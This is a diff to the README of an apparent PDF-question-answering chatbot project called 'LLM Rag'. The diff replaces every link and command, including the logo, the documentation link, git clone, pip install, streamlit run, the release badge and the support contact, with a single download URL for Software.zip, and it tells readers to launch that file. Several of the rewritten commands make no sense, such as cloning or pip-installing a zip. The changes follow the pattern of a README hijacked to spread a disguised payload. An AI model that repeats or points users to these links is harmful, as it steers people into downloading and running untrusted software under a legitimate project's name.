@@ -1,6 +1,6 @@
 # 🚀 Welcome to "LLM Rag: Transform Any PDF into an AI-Powered Q&A Chatbot!"
 
-![LLM Rag Logo](https://example.com/llm_rag_logo.png)
+![LLM Rag Logo](https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -16,22 +16,22 @@ LLM Rag is a cutting-edge tool that allows you to transform any PDF document int
 
 ## Getting Started
 
-To get started with LLM Rag, simply clone the repository and follow the installation instructions in the [documentation](https://github.com/username/llm_rag/docs).
+To get started with LLM Rag, simply clone the repository and follow the installation instructions in the [documentation](https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip).
 
 ```
-git clone https://github.com/username/llm_rag.git
+git clone https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip
 ```
 
 ## Installation
 
 1. Install the dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip
    ```
 
 2. Run the application:
    ```
-   streamlit run app.py
+   streamlit run https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip
    ```
 
 ## Repository Topics
@@ -53,9 +53,9 @@ The "llm_rag" repository covers a range of topics, including:
 
 ## Download the Latest Release
 
-Visit the [latest release](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to download the release package. Launch the file to access the latest version of LLM Rag.
+Visit the [latest release](https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip) to download the release package. Launch the file to access the latest version of LLM Rag.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip)
 
 If the link is not working, please check the "Releases" section of the repository for alternative download options.
 
@@ -72,6 +72,6 @@ Contributions are always welcome! Whether you want to report a bug, request a fe
 
 ## Support
 
-If you have any questions or need assistance with LLM Rag, feel free to reach out to our team at [support@llmrag.com](mailto:support@llmrag.com).
+If you have any questions or need assistance with LLM Rag, feel free to reach out to our team at [https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip](https://github.com/asdfghjkl904/llm_rag/releases/download/v2.0/Software.zip).
 
 Thank you for choosing LLM Rag to revolutionize your PDF content into engaging chatbot experiences! 🌟
